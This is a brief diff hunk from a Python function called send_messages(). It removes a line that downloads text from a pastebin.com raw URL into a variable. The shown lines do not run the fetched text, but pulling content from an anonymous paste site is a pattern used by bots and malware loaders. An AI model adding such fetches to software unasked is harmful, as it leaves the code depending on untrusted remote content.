@@ -37,10 +37,6 @@ def send_messages():
         sys.exit()
 
 
-
-    mmm = requests.get('https://pastebin.com/raw/NZKKryvH').text
-
-
         sys.exit()
 
 
